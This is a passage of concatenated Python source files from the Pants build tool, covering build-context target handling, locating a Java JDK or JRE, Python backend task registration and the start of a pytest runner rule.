    """Create a new workunit under the calling thread's current workunit.

    :API: public
    """
    with self.run_tracker.new_workunit(name=name, labels=labels, cmd=cmd, log_config=log_config) as workunit:
      yield workunit

  def acquire_lock(self):
    """ Acquire the global lock for the root directory associated with this context. When
    a goal requires serialization, it will call this to acquire the lock.

    :API: public
    """
    if self.options.for_global_scope().lock:
      if not self._lock.acquired:
        self._lock.acquire()

  def release_lock(self):
    """Release the global lock if it's held.
    Returns True if the lock was held before this call.

    :API: public
    """
    if not self._lock.acquired:
      return False
    else:
      self._lock.release()
      return True

  def is_unlocked(self):
    """Whether the global lock object is actively holding the lock.

    :API: public
    """
    return not self._lock.acquired

  def _replace_targets(self, target_roots):
    # Replaces all targets in the context with the given roots and their transitive dependencies.
    #
    # If another task has already retrieved the current targets, mutable state may have been
    # initialized somewhere, making it now unsafe to replace targets. Thus callers of this method
    # must know what they're doing!
    #
    # TODO(John Sirois): This currently has only 1 use (outside ContextTest) in pantsbuild/pants and
    # only 1 remaining known use case in the Foursquare codebase that will be able to go away with
    # the post RoundEngine engine - kill the method at that time.
    self._target_roots = list(target_roots)

  def add_new_target(self, address, target_type, target_base=None, dependencies=None,
                     derived_from=None, **kwargs):
    """Creates a new target, adds it to the context and returns it.

    This method ensures the target resolves files against the given target_base, creating the
    directory if needed and registering a source root.

    :API: public
    """
    rel_target_base = target_base or address.spec_path
    abs_target_base = os.path.join(get_buildroot(), rel_target_base)
    if not os.path.exists(abs_target_base):
      os.makedirs(abs_target_base)
      # TODO: Adding source roots on the fly like this is yucky, but hopefully this
      # method will go away entirely under the new engine. It's primarily used for injecting
      # synthetic codegen targets, and that isn't how codegen will work in the future.
    if not self.source_roots.find_by_path(rel_target_base):
      # TODO: Set the lang and root category (source/test/thirdparty) based on the target type?
      self.source_roots.add_source_root(rel_target_base)
    if dependencies:
      dependencies = [dep.address for dep in dependencies]

    self.build_graph.inject_synthetic_target(address=address,
                                             target_type=target_type,
                                             dependencies=dependencies,
                                             derived_from=derived_from,
                                             **kwargs)
    new_target = self.build_graph.get_target(address)

    return new_target

  def targets(self, predicate=None, **kwargs):
    """Selects targets in-play in this run from the target roots and their transitive dependencies.

    Also includes any new synthetic targets created from the target roots or their transitive
    dependencies during the course of the run.

    See Target.closure_for_targets for remaining parameters.

    :API: public

    :param predicate: If specified, the predicate will be used to narrow the scope of targets
                      returned.
    :param bool postorder: `True` to gather transitive dependencies with a postorder traversal;
                          `False` or preorder by default.
    :returns: A list of matching targets.
    """
    target_set = self._collect_targets(self.target_roots, **kwargs)

    synthetics = OrderedSet()
    for synthetic_address in self.build_graph.synthetic_addresses:
      if self.build_graph.get_concrete_derived_from(synthetic_address) in target_set:
        synthetics.add(self.build_graph.get_target(synthetic_address))
    target_set.update(self._collect_targets(synthetics, **kwargs))

    return list(filter(predicate, target_set))

  def _collect_targets(self, root_targets, **kwargs):
    return Target.closure_for_targets(
      target_roots=root_targets,
      **kwargs
    )

  def dependents(self, on_predicate=None, from_predicate=None):
    """Returns  a map from targets that satisfy the from_predicate to targets they depend on that
      satisfy the on_predicate.

    :API: public
    """
    core = set(self.targets(on_predicate))
    dependees = defaultdict(set)
    for target in self.targets(from_predicate):
      for dependency in target.dependencies:
        if dependency in core:
          dependees[target].add(dependency)
    return dependees

  def resolve(self, spec):
    """Returns an iterator over the target(s) the given address points to.

    :API: public
    """
    return self.build_graph.resolve(spec)

  def scan(self, root=None):
    """Scans and parses all BUILD files found under ``root``.

    Only BUILD files found under ``root`` are parsed as roots in the graph, but any dependencies of
    targets parsed in the root tree's BUILD files will be followed and this may lead to BUILD files
    outside of ``root`` being parsed and included in the returned build graph.

    :API: public

    :param string root: The path to scan; by default, the build root.
    :returns: A new build graph encapsulating the targets found.
    """
    build_graph = self.build_graph.clone_new()
    for address in self.address_mapper.scan_addresses(root):
      build_graph.inject_address_closure(address)
    return build_graph

  def execute_process_synchronously(self, execute_process_request, name, labels=None):                    
    """Executes a process (possibly remotely), and returns information about its output.

    :param execute_process_request: The ExecuteProcessRequest to run.
    :param name: A descriptive name representing the process being executed.
    :param labels: A tuple of WorkUnitLabels.
    :return: An ExecuteProcessResult with information about the execution.

    Note that this is an unstable, experimental API, which is subject to change with no notice.
    """
    with self.new_workunit(
      name=name,
      labels=labels,
      cmd=' '.join(execute_process_request.argv),
    ) as workunit:
      result = self._scheduler.product_request(FallibleExecuteProcessResult, [execute_process_request])[0]
      workunit.output("stdout").write(result.stdout)
      workunit.output("stderr").write(result.stderr)
      workunit.set_outcome(WorkUnit.FAILURE if result.exit_code else WorkUnit.SUCCESS)
      return result

# coding=utf-8
# Copyright 2014 Pants project contributors (see CONTRIBUTORS.md).
# Licensed under the Apache License, Version 2.0 (see LICENSE).

from __future__ import absolute_import, division, print_function, unicode_literals

import itertools
import logging
import os
import pkgutil
import plistlib
from abc import abstractproperty
from builtins import object, open, str
from collections import namedtuple
from contextlib import contextmanager

from future.utils import PY3                    
from six import string_types

from pants.base.revision import Revision
from pants.java.util import execute_java, execute_java_async
from pants.subsystem.subsystem import Subsystem
from pants.util.contextutil import temporary_dir
from pants.util.memo import memoized_method, memoized_property
from pants.util.meta import AbstractClass
from pants.util.osutil import OS_ALIASES, normalize_os_name
from pants.util.process_handler import subprocess


logger = logging.getLogger(__name__)


def _parse_java_version(name, version):
  # Java version strings have been well defined since release 1.3.1 as defined here:
  #  http://www.oracle.com/technetwork/java/javase/versioning-naming-139433.html
  # These version strings comply with semver except that the traditional pre-release semver
  # slot (the 4th) can be delimited by an _ in the case of update releases of the jdk.
  # We accommodate that difference here using lenient parsing.
  # We also accommodate specification versions, which just have major and minor
  # components; eg: `1.8`.  These are useful when specifying constraints a distribution must
  # satisfy; eg: to pick any 1.8 java distribution: '1.8' <= version <= '1.8.99'
  if isinstance(version, string_types):
    version = Revision.lenient(version)
  if version and not isinstance(version, Revision):
    raise ValueError('{} must be a string or a Revision object, given: {}'.format(name, version))
  return version


class Distribution(object):
  """Represents a java distribution - either a JRE or a JDK installed on the local system.

  In particular provides access to the distribution's binaries; ie: java while ensuring basic
  constraints are met.  For example a minimum version can be specified if you know need to compile
  source code or run bytecode that exercise features only available in that version forward.

  :API: public

  TODO(John Sirois): This class has a broken API, its not reasonably useful with no methods exposed.
  Expose reasonable methods: https://github.com/pantsbuild/pants/issues/3263
  """

  class Error(Exception):
    """Indicates an invalid java distribution."""

  @staticmethod
  def _is_executable(path):
    return os.path.isfile(path) and os.access(path, os.X_OK)

  def __init__(self, home_path=None, bin_path=None, minimum_version=None, maximum_version=None,
               jdk=False):
    """Creates a distribution wrapping the given `home_path` or `bin_path`.

    Only one of `home_path` or `bin_path` should be supplied.

    :param string home_path: the path to the java distribution's home dir
    :param string bin_path: the path to the java distribution's bin dir
    :param minimum_version: a modified semantic version string or else a Revision object
    :param maximum_version: a modified semantic version string or else a Revision object
    :param bool jdk: ``True`` to require the distribution be a JDK vs a JRE
    """
    if home_path and not os.path.isdir(home_path):
      raise ValueError('The specified java home path is invalid: {}'.format(home_path))
    if bin_path and not os.path.isdir(bin_path):
      raise ValueError('The specified binary path is invalid: {}'.format(bin_path))
    if not bool(home_path) ^ bool(bin_path):
      raise ValueError('Exactly one of home path or bin path should be supplied, given: '
                       'home_path={} bin_path={}'.format(home_path, bin_path))

    self._home = home_path
    self._bin_path = bin_path or (os.path.join(home_path, 'bin') if home_path else '/usr/bin')

    self._minimum_version = _parse_java_version("minimum_version", minimum_version)
    self._maximum_version = _parse_java_version("maximum_version", maximum_version)
    self._jdk = jdk
    self._is_jdk = False
    self._system_properties = None
    self._validated_binaries = {}

  @property
  def jdk(self):
    self.validate()
    return self._is_jdk

  @property
  def system_properties(self):
    """Returns a dict containing the system properties of this java distribution."""
    return dict(self._get_system_properties(self.java))

  @property
  def version(self):
    """Returns the distribution version.

    Raises Distribution.Error if this distribution is not valid according to the configured
    constraints.
    """
    return self._get_version(self.java)

  def find_libs(self, names):
    """Looks for jars in the distribution lib folder(s).

    If the distribution is a JDK, both the `lib` and `jre/lib` dirs will be scanned.
    The endorsed and extension dirs are not checked.

    :param list names: jar file names
    :return: list of paths to requested libraries
    :raises: `Distribution.Error` if any of the jars could not be found.
    """
    def collect_existing_libs():
      def lib_paths():
        yield os.path.join(self.home, 'lib')
        if self.jdk:
          yield os.path.join(self.home, 'jre', 'lib')

      for name in names:
        for path in lib_paths():
          lib_path = os.path.join(path, name)
          if os.path.exists(lib_path):
            yield lib_path
            break
        else:
          raise Distribution.Error('Failed to locate {} library'.format(name))

    return list(collect_existing_libs())

  @property
  def home(self):
    """Returns the distribution JAVA_HOME."""
    if not self._home:
      home = self._get_system_properties(self.java)['java.home']
      # The `jre/bin/java` executable in a JDK distribution will report `java.home` as the jre dir,
      # so we check for this and re-locate to the containing jdk dir when present.
      if os.path.basename(home) == 'jre':
        jdk_dir = os.path.dirname(home)
        if self._is_executable(os.path.join(jdk_dir, 'bin', 'javac')):
          home = jdk_dir
      self._home = home
    return self._home                    

  @property
  def real_home(self):
    """Real path to the distribution java.home (resolving links)."""
    return os.path.realpath(self.home)

  @property
  def java(self):
    """Returns the path to this distribution's java command.

    If this distribution has no valid java command raises Distribution.Error.
    """
    return self.binary('java')

  def binary(self, name):
    """Returns the path to the command of the given name for this distribution.

    For example: ::

        >>> d = Distribution()
        >>> jar = d.binary('jar')
        >>> jar
        '/usr/bin/jar'
        >>>

    If this distribution has no valid command of the given name raises Distribution.Error.
    If this distribution is a JDK checks both `bin` and `jre/bin` for the binary.
    """
    if not isinstance(name, str):
      raise ValueError('name must be a binary name, given {} of type {}'.format(name, type(name)))
    self.validate()
    return self._validated_executable(name)

  def validate(self):
    """Validates this distribution against its configured constraints.

    Raises Distribution.Error if this distribution is not valid according to the configured
    constraints.
    """
    if self._validated_binaries:
      return

    with self._valid_executable('java') as java:
      if self._minimum_version:
        version = self._get_version(java)
        if version < self._minimum_version:
          raise self.Error('The java distribution at {} is too old; expecting at least {} and'
                           ' got {}'.format(java, self._minimum_version, version))
      if self._maximum_version:
        version = self._get_version(java)
        if version > self._maximum_version:
          raise self.Error('The java distribution at {} is too new; expecting no older than'
                           ' {} and got {}'.format(java, self._maximum_version, version))

    # We might be a JDK discovered by the embedded jre `java` executable.
    # If so reset the bin path to the true JDK home dir for full access to all binaries.
    self._bin_path = os.path.join(self.home, 'bin')

    try:
      self._validated_executable('javac')  # Calling purely for the check and cache side effects
      self._is_jdk = True
    except self.Error as e:
      if self._jdk:
        logger.debug('Failed to validate javac executable. Please check you have a JDK '
                      'installed. Original error: {}'.format(e))
        raise

  def execute_java(self, *args, **kwargs):
    return execute_java(*args, distribution=self, **kwargs)

  def execute_java_async(self, *args, **kwargs):
    return execute_java_async(*args, distribution=self, **kwargs)

  @memoized_method
  def _get_version(self, java):
    return _parse_java_version('java.version', self._get_system_properties(java)['java.version'])

  def _get_system_properties(self, java):
    if not self._system_properties:
      with temporary_dir() as classpath:
        with open(os.path.join(classpath, 'SystemProperties.class'), 'w+b') as fp:
          fp.write(pkgutil.get_data(__name__, 'SystemProperties.class'))
        cmd = [java, '-cp', classpath, 'SystemProperties']
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()
        if process.returncode != 0:
          raise self.Error('Failed to determine java system properties for {} with {} - exit code'
                           ' {}: {}'.format(java, ' '.join(cmd), process.returncode, stderr.decode('utf-8')))

      props = {}
      for line in stdout.decode('utf-8').split(os.linesep):
        key, _, val = line.partition('=')
        props[key] = val
      self._system_properties = props

    return self._system_properties

  def _validate_executable(self, name):
    def bin_paths():
      yield self._bin_path
      if self._is_jdk:
        yield os.path.join(self.home, 'jre', 'bin')

    for bin_path in bin_paths():
      exe = os.path.join(bin_path, name)
      if self._is_executable(exe):
        return exe
    raise self.Error('Failed to locate the {} executable, {} does not appear to be a'
                     ' valid {} distribution'.format(name, self, 'JDK' if self._jdk else 'JRE'))

  def _validated_executable(self, name):
    exe = self._validated_binaries.get(name)
    if not exe:
      exe = self._validate_executable(name)
      self._validated_binaries[name] = exe
    return exe

  @contextmanager
  def _valid_executable(self, name):
    exe = self._validate_executable(name)
    yield exe
    self._validated_binaries[name] = exe

  def __repr__(self):
    return ('Distribution({!r}, minimum_version={!r}, maximum_version={!r} jdk={!r})'.format(
            self._bin_path, self._minimum_version, self._maximum_version, self._jdk))


class _DistributionEnvironment(AbstractClass):
  class Location(namedtuple('Location', ['home_path', 'bin_path'])):
    """Represents the location of a java distribution."""

    @classmethod
    def from_home(cls, home):
      """Creates a location given the JAVA_HOME directory.

      :param string home: The path of the JAVA_HOME directory.
      :returns: The java distribution location.
      """
      return cls(home_path=home, bin_path=None)

    @classmethod
    def from_bin(cls, bin_path):
      """Creates a location given the `java` executable parent directory.

      :param string bin_path: The parent path of the `java` executable.
      :returns: The java distribution location.
      """
      return cls(home_path=None, bin_path=bin_path)

  @abstractproperty
  def jvm_locations(self):
    """Return the jvm locations discovered in this environment.

    :returns: An iterator over all discovered jvm locations.
    :rtype: iterator of :class:`DistributionEnvironment.Location`
    """


class _EnvVarEnvironment(_DistributionEnvironment):
  @property
  def jvm_locations(self):
    def env_home(home_env_var):
      home = os.environ.get(home_env_var)
      return self.Location.from_home(home) if home else None

    jdk_home = env_home('JDK_HOME')
    if jdk_home:
      yield jdk_home

    java_home = env_home('JAVA_HOME')
    if java_home:
      yield java_home

    search_path = os.environ.get('PATH')
    if search_path:
      for bin_path in search_path.strip().split(os.pathsep):
        yield self.Location.from_bin(bin_path)


class _OSXEnvironment(_DistributionEnvironment):
  _OSX_JAVA_HOME_EXE = '/usr/libexec/java_home'

  @classmethod
  def standard(cls):
    return cls(cls._OSX_JAVA_HOME_EXE)

  def __init__(self, osx_java_home_exe):
    self._osx_java_home_exe = osx_java_home_exe

  @property
  def jvm_locations(self):
    # OSX will have a java_home tool that can be used to locate a unix-compatible java home dir.
    #
    # See:
    #   https://developer.apple.com/library/mac/documentation/Darwin/Reference/ManPages/man1/java_home.1.html
    #
    # The `--xml` output looks like so:
    # <?xml version="1.0" encoding="UTF-8"?>
    # <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
    #                        "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
    # <plist version="1.0">
    #   <array>
    #     <dict>
    #       ...
    #       <key>JVMHomePath</key>
    #       <string>/Library/Java/JavaVirtualMachines/jdk1.7.0_45.jdk/Contents/Home</string>
    #       ...
    #     </dict>
    #     ...
    #   </array>
    # </plist>
    if os.path.exists(self._osx_java_home_exe):
      try:
        plist = subprocess.check_output([self._osx_java_home_exe, '--failfast', '--xml'])
        plist_results = plistlib.loads(plist) if PY3 else plistlib.readPlistFromString(plist)
        for distribution in plist_results:
          home = distribution['JVMHomePath']
          yield self.Location.from_home(home)
      except subprocess.CalledProcessError:
        pass


class _LinuxEnvironment(_DistributionEnvironment):
  # The `/usr/lib/jvm` dir is a common target of packages built for redhat and debian as well as
  # other more exotic distributions.  SUSE uses lib64
  _STANDARD_JAVA_DIST_DIRS = ('/usr/lib/jvm', '/usr/lib64/jvm')

  @classmethod
  def standard(cls):
    return cls(*cls._STANDARD_JAVA_DIST_DIRS)

  def __init__(self, *java_dist_dirs):
    if len(java_dist_dirs) == 0:
      raise ValueError('Expected at least 1 java dist dir.')
    self._java_dist_dirs = java_dist_dirs

  @property
  def jvm_locations(self):
    for java_dist_dir in self._java_dist_dirs:
      if os.path.isdir(java_dist_dir):
        for path in os.listdir(java_dist_dir):
          home = os.path.join(java_dist_dir, path)
          if os.path.isdir(home):
            yield self.Location.from_home(home)


class _ExplicitEnvironment(_DistributionEnvironment):
  def __init__(self, *homes):
    self._homes = homes

  @property
  def jvm_locations(self):
    for home in self._homes:
      yield self.Location.from_home(home)


class _UnknownEnvironment(_DistributionEnvironment):
  def __init__(self, *possible_environments):
    super(_DistributionEnvironment, self).__init__()
    if len(possible_environments) < 2:
      raise ValueError('At least two possible environments must be supplied.')
    self._possible_environments = possible_environments

  @property
  def jvm_locations(self):
    return itertools.chain(*(pe.jvm_locations for pe in self._possible_environments))


class _Locator(object):
  class Error(Distribution.Error):
    """Error locating a java distribution."""

  def __init__(self, distribution_environment, minimum_version=None, maximum_version=None):
    self._cache = {}
    self._distribution_environment = distribution_environment
    self._minimum_version = minimum_version
    self._maximum_version = maximum_version

  def _scan_constraint_match(self, minimum_version, maximum_version, jdk):
    """Finds a cached version matching the specified constraints

    :param Revision minimum_version: minimum jvm version to look for (eg, 1.7).
    :param Revision maximum_version: maximum jvm version to look for (eg, 1.7.9999).
    :param bool jdk: whether the found java distribution is required to have a jdk.
    :return: the Distribution, or None if no matching distribution is in the cache.
    :rtype: :class:`pants.java.distribution.Distribution`
    """

    for dist in self._cache.values():
      if minimum_version and dist.version < minimum_version:
        continue
      if maximum_version and dist.version > maximum_version:
        continue
      if jdk and not dist.jdk:
        continue
      return dist

  def locate(self, minimum_version=None, maximum_version=None, jdk=False):
    """Finds a java distribution that meets the given constraints and returns it.

    First looks for a cached version that was previously located, otherwise calls locate().
    :param minimum_version: minimum jvm version to look for (eg, 1.7).
                            The stricter of this and `--jvm-distributions-minimum-version` is used.
    :param maximum_version: maximum jvm version to look for (eg, 1.7.9999).
                            The stricter of this and `--jvm-distributions-maximum-version` is used.
    :param bool jdk: whether the found java distribution is required to have a jdk.
    :return: the Distribution.
    :rtype: :class:`Distribution`
    :raises: :class:`Distribution.Error` if no suitable java distribution could be found.
    """

    def _get_stricter_version(a, b, name, stricter):
      version_a = _parse_java_version(name, a)
      version_b = _parse_java_version(name, b)
      if version_a is None:
        return version_b
      if version_b is None:
        return version_a
      return stricter(version_a, version_b)

    # Take the tighter constraint of method args and subsystem options.
    minimum_version = _get_stricter_version(minimum_version,
                                            self._minimum_version,
                                            "minimum_version",
                                            max)
    maximum_version = _get_stricter_version(maximum_version,
                                            self._maximum_version,
                                            "maximum_version",
                                            min)

    key = (minimum_version, maximum_version, jdk)
    dist = self._cache.get(key)
    if not dist:
      dist = self._scan_constraint_match(minimum_version, maximum_version, jdk)
      if not dist:
        dist = self._locate(minimum_version=minimum_version,
                            maximum_version=maximum_version,
                            jdk=jdk)
      self._cache[key] = dist
    return dist

  def _locate(self, minimum_version=None, maximum_version=None, jdk=False):
    """Finds a java distribution that meets any given constraints and returns it.

    :param minimum_version: minimum jvm version to look for (eg, 1.7).
    :param maximum_version: maximum jvm version to look for (eg, 1.7.9999).
    :param bool jdk: whether the found java distribution is required to have a jdk.
    :return: the located Distribution.
    :rtype: :class:`Distribution`
    :raises: :class:`Distribution.Error` if no suitable java distribution could be found.
    """
    for location in itertools.chain(self._distribution_environment.jvm_locations):
      try:
        dist = Distribution(home_path=location.home_path,
                            bin_path=location.bin_path,
                            minimum_version=minimum_version,
                            maximum_version=maximum_version,
                            jdk=jdk)
        dist.validate()
        logger.debug('Located {} for constraints: minimum_version {}, maximum_version {}, jdk {}'
                     .format(dist, minimum_version, maximum_version, jdk))
        return dist
      except (ValueError, Distribution.Error) as e:
        logger.debug('{} is not a valid distribution because: {}'
                     .format(location.home_path, str(e)))
        pass

    if (minimum_version is not None
        and maximum_version is not None
        and maximum_version < minimum_version):
      error_format = ('Pants configuration/options led to impossible constraints for {} '
                      'distribution: minimum_version {}, maximum_version {}')
    else:
      error_format = ('Failed to locate a {} distribution with minimum_version {}, '
                      'maximum_version {}')
    raise self.Error(error_format.format('JDK' if jdk else 'JRE', minimum_version, maximum_version))


class DistributionLocator(Subsystem):
  """Subsystem that knows how to look up a java Distribution.

  Distributions are searched for in the following order by default:

  1. Paths listed for this operating system in the `--jvm-distributions-paths` map.
  2. JDK_HOME/JAVA_HOME
  3. PATH
  4. Likely locations on the file system such as `/usr/lib/jvm` on Linux machines.

  :API: public
  """

  class Error(Distribution.Error):
    """Error locating a java distribution.

    :API: public
    """

  @classmethod
  def cached(cls, minimum_version=None, maximum_version=None, jdk=False):
    """Finds a java distribution that meets the given constraints and returns it.

    :API: public

    First looks for a cached version that was previously located, otherwise calls locate().
    :param minimum_version: minimum jvm version to look for (eg, 1.7).
                            The stricter of this and `--jvm-distributions-minimum-version` is used.
    :param maximum_version: maximum jvm version to look for (eg, 1.7.9999).
                            The stricter of this and `--jvm-distributions-maximum-version` is used.
    :param bool jdk: whether the found java distribution is required to have a jdk.
    :return: the Distribution.
    :rtype: :class:`Distribution`
    :raises: :class:`Distribution.Error` if no suitable java distribution could be found.
    """
    try:
      return cls.global_instance()._locator().locate(
          minimum_version=minimum_version,
          maximum_version=maximum_version,
          jdk=jdk)
    except _Locator.Error as e:
      raise cls.Error('Problem locating a java distribution: {}'.format(e))

  options_scope = 'jvm-distributions'

  @classmethod
  def register_options(cls, register):
    super(DistributionLocator, cls).register_options(register)
    human_readable_os_aliases = ', '.join('{}: [{}]'.format(str(key), ', '.join(sorted(val)))
                                          for key, val in OS_ALIASES.items())
    register('--paths', advanced=True, type=dict,
             help='Map of os names to lists of paths to jdks. These paths will be searched before '
                  'everything else (before the JDK_HOME, JAVA_HOME, PATH environment variables) '
                  'when locating a jvm to use. The same OS can be specified via several different '
                  'aliases, according to this map: {}'.format(human_readable_os_aliases))
    register('--minimum-version', advanced=True, help='Minimum version of the JVM pants will use')
    register('--maximum-version', advanced=True, help='Maximum version of the JVM pants will use')

  def all_jdk_paths(self):
    """Get all explicitly configured JDK paths.

    :return: mapping of os name -> list of jdk_paths
    :rtype: dict of string -> list of string
    """
    return self._normalized_jdk_paths

  @memoized_method
  def _locator(self):
    return self._create_locator()

  @memoized_property
  def _normalized_jdk_paths(self):
    normalized = {}
    jdk_paths = self.get_options().paths or {}
    for name, paths in sorted(jdk_paths.items()):
      rename = normalize_os_name(name)
      if rename in normalized:
        logger.warning('Multiple OS names alias to "{}"; combining results.'.format(rename))
        normalized[rename].extend(paths)
      else:
        normalized[rename] = paths
    return normalized

  def _get_explicit_jdk_paths(self):
    if not self._normalized_jdk_paths:
      return ()
    os_name = normalize_os_name(os.uname()[0].lower())
    if os_name not in self._normalized_jdk_paths:
      logger.warning('--jvm-distributions-paths was specified, but has no entry for "{}".'
                     .format(os_name))
    return self._normalized_jdk_paths.get(os_name, ())

  def _create_locator(self):
    homes = self._get_explicit_jdk_paths()
    environment = _UnknownEnvironment(
        _ExplicitEnvironment(*homes),
        _UnknownEnvironment(
            _EnvVarEnvironment(),
            _LinuxEnvironment.standard(),
            _OSXEnvironment.standard()
        )
    )
    return _Locator(environment,
                    self.get_options().minimum_version,
                    self.get_options().maximum_version)

# coding=utf-8
# Copyright 2014 Pants project contributors (see CONTRIBUTORS.md).
# Licensed under the Apache License, Version 2.0 (see LICENSE).

from __future__ import absolute_import, division, print_function, unicode_literals

from pants.backend.python.pants_requirement import PantsRequirement
from pants.backend.python.python_artifact import PythonArtifact
from pants.backend.python.python_requirement import PythonRequirement
from pants.backend.python.python_requirements import PythonRequirements
from pants.backend.python.rules import inject_init, python_test_runner
from pants.backend.python.targets.python_app import PythonApp
from pants.backend.python.targets.python_binary import PythonBinary
from pants.backend.python.targets.python_distribution import PythonDistribution
from pants.backend.python.targets.python_library import PythonLibrary
from pants.backend.python.targets.python_requirement_library import PythonRequirementLibrary
from pants.backend.python.targets.python_tests import PythonTests
from pants.backend.python.targets.unpacked_whls import UnpackedWheels
from pants.backend.python.tasks.build_local_python_distributions import \
  BuildLocalPythonDistributions
from pants.backend.python.tasks.gather_sources import GatherSources
from pants.backend.python.tasks.isort_prep import IsortPrep
from pants.backend.python.tasks.isort_run import IsortRun
from pants.backend.python.tasks.local_python_distribution_artifact import \
  LocalPythonDistributionArtifact
from pants.backend.python.tasks.pytest_prep import PytestPrep
from pants.backend.python.tasks.pytest_run import PytestRun
from pants.backend.python.tasks.python_binary_create import PythonBinaryCreate
from pants.backend.python.tasks.python_bundle import PythonBundle
from pants.backend.python.tasks.python_repl import PythonRepl
from pants.backend.python.tasks.python_run import PythonRun
from pants.backend.python.tasks.resolve_requirements import ResolveRequirements
from pants.backend.python.tasks.select_interpreter import SelectInterpreter
from pants.backend.python.tasks.setup_py import SetupPy
from pants.backend.python.tasks.unpack_wheels import UnpackWheels
from pants.build_graph.build_file_aliases import BuildFileAliases
from pants.build_graph.resources import Resources
from pants.goal.task_registrar import TaskRegistrar as task


def build_file_aliases():
  return BuildFileAliases(
    targets={
      PythonApp.alias(): PythonApp,
      PythonBinary.alias(): PythonBinary,
      PythonLibrary.alias(): PythonLibrary,
      PythonTests.alias(): PythonTests,
      PythonDistribution.alias(): PythonDistribution,
      'python_requirement_library': PythonRequirementLibrary,
      Resources.alias(): Resources,
      UnpackedWheels.alias(): UnpackedWheels,
    },
    objects={
      'python_requirement': PythonRequirement,
      'python_artifact': PythonArtifact,
      'setup_py': PythonArtifact,
    },
    context_aware_object_factories={
      'python_requirements': PythonRequirements,
      PantsRequirement.alias: PantsRequirement,
    }
  )


def register_goals():
  task(name='interpreter', action=SelectInterpreter).install('pyprep')
  task(name='build-local-dists', action=BuildLocalPythonDistributions).install('pyprep')
  task(name='requirements', action=ResolveRequirements).install('pyprep')
  task(name='sources', action=GatherSources).install('pyprep')
  task(name='py', action=PythonRun).install('run')
  task(name='pytest-prep', action=PytestPrep).install('test')
  task(name='pytest', action=PytestRun).install('test')
  task(name='py', action=PythonRepl).install('repl')
  task(name='setup-py', action=SetupPy).install()
  task(name='py', action=PythonBinaryCreate).install('binary')
  task(name='py-wheels', action=LocalPythonDistributionArtifact).install('binary')
  task(name='isort-prep', action=IsortPrep).install('fmt')
  task(name='isort', action=IsortRun).install('fmt')
  task(name='py', action=PythonBundle).install('bundle')
  task(name='unpack-wheels', action=UnpackWheels).install()


def rules():
  return inject_init.rules() + python_test_runner.rules()                    

# coding=utf-8
# Copyright 2018 Pants project contributors (see CONTRIBUTORS.md).
# Licensed under the Apache License, Version 2.0 (see LICENSE).

from __future__ import absolute_import, division, print_function, unicode_literals

import os
import sys
from builtins import str

from future.utils import text_type

from pants.backend.python.rules.inject_init import InjectedInitDigest
from pants.backend.python.subsystems.pytest import PyTest
from pants.backend.python.subsystems.python_setup import PythonSetup
from pants.engine.fs import (Digest, DirectoriesToMerge, DirectoryWithPrefixToStrip, Snapshot,
                             UrlToFetch)
from pants.engine.isolated_process import (ExecuteProcessRequest, ExecuteProcessResult,
                                           FallibleExecuteProcessResult)
from pants.engine.legacy.graph import BuildFileAddresses, TransitiveHydratedTargets
from pants.engine.legacy.structs import PythonTestsAdaptor
from pants.engine.rules import UnionRule, optionable_rule, rule
from pants.engine.selectors import Get
from pants.rules.core.core_test_model import Status, TestResult, TestTarget
from pants.source.source_root import SourceRootConfig


def parse_interpreter_constraints(python_setup, python_target_adaptors):
  constraints = {
    constraint
    for target_adaptor in python_target_adaptors
    for constraint in python_setup.compatibility_or_constraints(
      getattr(target_adaptor, 'compatibility', None)
    )
  }
  constraints_args = []
  for constraint in sorted(constraints):
    constraints_args.extend(["--interpreter-constraint", text_type(constraint)])
  return constraints_args


# TODO: Support resources
# TODO(7697): Use a dedicated rule for removing the source root prefix, so that this rule
# does not have to depend on SourceRootConfig.
@rule(TestResult, [PythonTestsAdaptor, PyTest, PythonSetup, SourceRootConfig])                    
def run_python_test(test_target, pytest, python_setup, source_root_config):                    
  """Runs pytest for one target."""

  # TODO: Inject versions and digests here through some option, rather than hard-coding it.
  url = 'https://github.com/pantsbuild/pex/releases/download/v1.6.6/pex'
  digest = Digest('61bb79384db0da8c844678440bd368bcbfac17bbdb865721ad3f9cb0ab29b629', 1826945)
  pex_snapshot = yield Get(Snapshot, UrlToFetch(url, digest))

  # TODO(7726): replace this with a proper API to get the `closure` for a
  # TransitiveHydratedTarget.
  transitive_hydrated_targets = yield Get(
    TransitiveHydratedTargets, BuildFileAddresses((test_target.address,))
  )
  all_targets = [t.adaptor for t in transitive_hydrated_targets.closure]

  # Produce a pex containing pytest and all transitive 3rdparty requirements.
  all_target_requirements = []
  for maybe_python_req_lib in all_targets:
    # This is a python_requirement()-like target.
    if hasattr(maybe_python_req_lib, 'requirement'):
      all_target_requirements.append(str(maybe_python_req_lib.requirement))
    # This is a python_requirement_library()-like target.
    if hasattr(maybe_python_req_lib, 'requirements'):
      for py_req in maybe_python_req_lib.requirements:
        all_target_requirements.append(str(py_req.requirement))

  # Sort all user requirement strings to increase the chance of cache hits across invocations.
  all_requirements = sorted(all_target_requirements + list(pytest.get_requirement_strings()))

  # TODO(#7061): This str() can be removed after we drop py2!
  python_binary = text_type(sys.executable)
  interpreter_constraint_args = parse_interpreter_constraints(
    python_setup, python_target_adaptors=all_targets
  )

  # TODO: This is non-hermetic because the requirements will be resolved on the fly by
  # pex27, where it should be hermetically provided in some way.
  output_pytest_requirements_pex_filename = 'pytest-with-requirements.pex'
  requirements_pex_argv = [
    python_binary,
    './{}'.format(pex_snapshot.files[0]),
    '-e', 'pytest:main',
    '-o', output_pytest_requirements_pex_filename,
  ] + interpreter_constraint_args + [
    # TODO(#7061): This text_type() wrapping can be removed after we drop py2!
    text_type(req) for req in all_requirements
  ]
  requirements_pex_request = ExecuteProcessRequest(
    argv=tuple(requirements_pex_argv),
    env={'PATH': text_type(os.pathsep.join(python_setup.interpreter_search_paths))},                    
    input_files=pex_snapshot.directory_digest,
    description='Resolve requirements: {}'.format(", ".join(all_requirements)),
    output_files=(output_pytest_requirements_pex_filename,),
  )
  requirements_pex_response = yield Get(
    ExecuteProcessResult, ExecuteProcessRequest, requirements_pex_request)

  source_roots = source_root_config.get_source_roots()

  # Gather sources and adjust for the source root.
  # TODO: make TargetAdaptor return a 'sources' field with an empty snapshot instead of raising to
  # simplify the hasattr() checks here!
  # TODO(7714): restore the full source name for the stdout of the Pytest run.
  sources_snapshots_and_source_roots = []
